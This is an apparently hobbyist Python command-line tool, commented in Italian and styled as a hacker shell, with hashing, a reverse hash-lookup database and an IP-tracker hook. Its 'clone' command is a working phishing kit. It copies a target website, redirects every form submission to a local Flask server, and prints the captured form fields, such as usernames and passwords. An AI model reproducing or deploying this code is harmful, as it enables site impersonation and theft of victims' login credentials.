import cmd, os, sys, hashlib, socket, requests, re, shutil, subprocess
from flask import Flask, request

# --- SETUP PERCORSI ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
MODULI_DIR = os.path.join(BASE_DIR, 'moduli/')
sys.path.append(MODULI_DIR)

# --- IMPORT DINAMICO CON DIAGNOSTICA ---
try:
    from ip_shadow import tracker
except ImportError:
    tracker = None

try:
    from website_cloning import cloning
except ImportError:
    cloning = None

try:
    # Importiamo la funzione di ricerca dal tuo modulo
    from deHasing.dehasing import cerca_match_deHasing
except ImportError as e:
    cerca_match_deHasing = None
    print(f"\033[91m[!] Errore Modulo deHasing: {e}\033[0m")

class CyberShadowShell(cmd.Cmd):
    intro = "\033[92m[CYBERSHADOW OS v1.6 - AUTO-LEARNING MODE]\033[0m\nOgni hash generato verrà salvato nel database.\n"
    
    def __init__(self):
        super().__init__()
        self.update_prompt()

    def update_prompt(self):
        self.prompt = f'\033[94m┌──(\033[92mCyberUser\033[0m)-\033[94m[\033[97m{os.getcwd()}\033[94m]\n└─\033[92m$\033[0m '

    def postcmd(self, stop, line):
        self.update_prompt()
        return stop

    # --- 1. COMANDO HASH (CON AUTO-APPRENDIMENTO) ---
    def do_hash(self, arg):
        """Genera Hash e salva nel database: hash <testo>"""
        if not arg:
            print("\033[93mUso: hash <testo>\033[0m")
            return
        
        sha256_val = hashlib.sha256(arg.encode()).hexdigest()
        md5_val = hashlib.md5(arg.encode()).hexdigest()
        
        print(f"MD5:    {md5_val}")
        print(f"SHA256: {sha256_val}")

        # Percorso del database nel modulo deHasing
        db_path = os.path.join(MODULI_DIR, 'deHasing', 'deHasing.txt')
        
        try:
            # Verifichiamo se l'hash esiste già per non sporcare il file
            presente = False
            if os.path.exists(db_path):
                with open(db_path, "r") as f:
                    content = f.read()
                    if sha256_val in content:
                        presente = True
            
            if not presente:
                with open(db_path, "a") as f:
                    f.write(f"{sha256_val}:{arg}\n")
                print(f"\033[94m[*] Database aggiornato: '{arg}' memorizzato.\033[0m")
            else:
                print(f"\033[90m[*] Hash già conosciuto.\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Errore salvataggio: {e}\033[0m")

    # --- 2. COMANDO DEHASING (LOOKUP) ---
    def do_dehasing(self, arg):
        """Cerca un hash nel database: dehasing <hash>"""
        if cerca_match_deHasing is None:
            print("\033[91m[!] Modulo deHasing non caricato.\033[0m")
            return
        
        target = arg if arg else input("Hash SHA-256: ").strip()
        if not target: return

        print(f"[*] Interrogazione database locale...")
        risultato = cerca_match_deHasing(target)
        
        if risultato and "Nessun match" not in risultato:
            print(f"\033[92m[+] Corrispondenza trovata: {risultato}\033[0m")
        else:
            print("\033[91m[-] Hash ignoto.\033[0m")

    # --- 3. TOOLS DI SISTEMA ---
    def do_track(self, arg):
        """IP Tracker: track <ip>"""
        if not tracker: print("[!] Modulo ip_shadow mancante."); return
        ip = arg if arg else input("IP Target: ")
        tracker.tracker_manuale(ip)

    def do_clone(self, arg):
        """Clona sito e cattura dati: clone <url>"""
        target = arg if arg else input("URL: ")
        try:
            if not target.startswith("http"): target = "http://" + target
            r = requests.get(target, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            html = re.sub(r'action=["\']http[s]?://.*?["\']', 'action="/"', r.text)
            with open(os.path.join(BASE_DIR, "index.html"), "w", encoding="utf-8") as f:
                f.write(html)
            print("[OK] Sito clonato. Avvio server...")
            self.run_server()
        except Exception as e: print(f"Errore: {e}")

    def run_server(self):
        app = Flask(__name__)
        @app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
        @app.route('/<path:path>', methods=['GET', 'POST'])
        def handler(path):
            if request.method == 'POST':
                print(f"\033[91m[CATTURATO]: {request.form.to_dict()}\033[0m")
            return open(os.path.join(BASE_DIR, "index.html"), "r", encoding="utf-8").read()
        app.run(host='0.0.0.0', port=8080)

    # --- 4. NAVIGAZIONE ---
    def do_ls(self, arg):
        for f in os.listdir('.'):
            c = "\033[94m" if os.path.isdir(f) else "\033[97m"
            print(f"{c}{f}\033[0m", end="  ")
        print()

    def do_cd(self, arg):
        try: os.chdir(arg if arg else os.path.expanduser("~"))
        except Exception as e: print(f"Errore: {e}")

    def do_clear(self, arg): os.system('cls' if os.name == 'nt' else 'clear')
    def do_exit(self, arg): return True

if __name__ == '__main__':
    CyberShadowShell().cmdloop()